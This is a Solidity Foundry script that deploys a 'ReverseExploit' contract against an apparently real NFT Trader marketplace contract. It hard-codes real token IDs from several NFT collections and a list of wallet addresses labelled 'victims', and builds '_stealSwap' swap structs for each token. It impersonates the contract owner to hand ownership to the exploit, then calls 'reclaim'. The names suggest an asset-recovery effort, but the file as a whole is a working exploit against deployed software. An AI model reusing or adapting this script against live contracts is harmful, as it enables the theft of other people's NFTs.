// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {IERC721} from "forge-std/interfaces/IERC721.sol";
import {ReverseExploit, INFTTrader, swapStruct, swapIntent, swapStatus} from "../src/ReverseExploit.sol";

contract ReverseExploitScript is Script {
    ReverseExploit public _exploit;

    address _quit = 0xC218D847a18E521Ae08F49F7c43882b6d1963c60;

    swapStruct[] _nftsOne;
    swapStruct[] _nftsTwo;
    uint256[] private blc;

    uint256[] ocmTokenIds;
    uint256[] hashMaskTokenIds;
    uint256[] feudalzTokenIds;
    uint256[] loomlockTokenIds;
    uint256[] partyBearTokenIds;
    uint256[] gameDiseaseTokenIds;
    uint256[] kingzTokenIds;
    uint256[] tokenIds;
    uint256[] allTokenIds;
    address[] victims;
    address[] targets;

    swapStruct[] structs;

    uint256 _swapId;

    function setUp() public {}

    function run() public {
        // vm.broadcast();

        vm.prank(_quit);
        _exploit = new ReverseExploit();

        _swapId = uint256(vm.load(0xC310e760778ECBca4C65B6C559874757A4c4Ece0, 0x0000000000000000000000000000000000000000000000000000000000000008));

        ocmTokenIds.push(2817);
        victims.push(0xaEDa87F3F3d68337Ed3cf32D98DBbc94c380eBBC);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        ocmTokenIds.push(9408);
        victims.push(0x99E82A0cdDD0bcb13274c30398024130B1D1A43A);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        ocmTokenIds.push(7331);
        victims.push(0x91d732C0d0a95760a4B5Fb2dfCBaDfB4Cd17E26F);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        ocmTokenIds.push(2401);
        victims.push(0x91d732C0d0a95760a4B5Fb2dfCBaDfB4Cd17E26F);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        ocmTokenIds.push(8552);
        victims.push(0x91d732C0d0a95760a4B5Fb2dfCBaDfB4Cd17E26F);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);

        tokenIds.push(0);
        for (uint256 i = 0; i < ocmTokenIds.length; i++) {
            tokenIds[0] = ocmTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0x960b7a6BCD451c9968473f7bbFd9Be826EFd549A,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        hashMaskTokenIds.push(12525);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(2215);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(13342);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(5887);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(14851);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(6249);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(77);
        victims.push(0xCe53dCF94e9DadC8eB56B67E581E8003138460BD);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(3346);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(8167);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(13927);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
        hashMaskTokenIds.push(13280);
        victims.push(0x14F1Bd275827538775558C01b1C075bCCC1916Ca);
        targets.push(0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);

        for (uint256 i = 0; i < hashMaskTokenIds.length; i++) {
            tokenIds[0] = hashMaskTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0xC2C747E0F7004F9E8817Db2ca4997657a7746928,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        loomlockTokenIds.push(667);
        victims.push(0x7b1319f8dF3d3C5916e5C9F4e8f0005ffeA35654);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);

        for (uint256 i = 0; i < loomlockTokenIds.length; i++) {
            tokenIds[0] = loomlockTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0x1D20A51F088492A0f1C57f047A9e30c9aB5C07Ea,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        partyBearTokenIds.push(9603);
        victims.push(0xF2bB00C32F0E735fCd1ad36cAAA56f4C53dDa452);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);
        partyBearTokenIds.push(8046);
        victims.push(0xF2bB00C32F0E735fCd1ad36cAAA56f4C53dDa452);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);
        partyBearTokenIds.push(4867);
        victims.push(0xF2bB00C32F0E735fCd1ad36cAAA56f4C53dDa452);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);
        partyBearTokenIds.push(469);
        victims.push(0xF2bB00C32F0E735fCd1ad36cAAA56f4C53dDa452);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);
        partyBearTokenIds.push(7669);
        victims.push(0xE58fA795B65Cc9BCF380e5Aa6c861CFB9a14b6ee);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);

        for (uint256 i = 0; i < partyBearTokenIds.length; i++) {
            tokenIds[0] = partyBearTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0x35471f47c3C0BC5FC75025b97A19ECDDe00F78f8,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        kingzTokenIds.push(2396);
        victims.push(0x702161763b21e21256c2Ec8a79Cb581EA39c0Af3);
        targets.push(0xa4E428F4Cc1fDbd449611819928C30582Fba9a34);

        for (uint256 i = 0; i < kingzTokenIds.length; i++) {
            tokenIds[0] = kingzTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0x0c2E57EFddbA8c768147D1fdF9176a0A6EBd5d83,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        gameDiseaseTokenIds.push(7719);
        victims.push(0xE58fA795B65Cc9BCF380e5Aa6c861CFB9a14b6ee);
        targets.push(0x4FC9F9115d877894FF1E23eDc0656Bb5838CEDb0);

        for (uint256 i = 0; i < gameDiseaseTokenIds.length; i++) {
            tokenIds[0] = gameDiseaseTokenIds[i];
            allTokenIds.push(tokenIds[0]);
            swapStruct memory _stealSwap = swapStruct(
                0x6023Da5C4ED130E73cd816ec931B562Db2c346bB,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        vm.prank(INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0).owner());

        INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0).transferOwnership(address(_exploit));

        vm.prank(_quit);
        _exploit.reclaim{value: 0.01 ether * structs.length}(structs, _swapId, targets, victims, allTokenIds);
    }
}
